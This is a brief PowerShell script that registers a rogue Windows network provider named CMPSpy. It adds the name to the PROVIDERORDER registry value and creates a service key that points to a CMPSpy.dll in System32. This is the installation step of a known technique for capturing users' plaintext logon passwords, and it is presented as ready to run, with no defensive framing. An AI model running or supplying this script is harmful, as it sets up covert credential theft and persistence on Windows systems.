# simple script by @LadhaAleem (https://twitter.com/LadhaAleem) making necessary registry changes.
# it assumes you already have something in the PROVIDERORDER, which is quite common.

$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",CMPSpy"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue

New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\CMPSpy
New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\CMPSpy\NetworkProvider
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\CMPSpy\NetworkProvider -Name "Class" -Value 2
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\CMPSpy\NetworkProvider -Name "Name" -Value CMPSpy
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\CMPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\CMPSpy.dll"
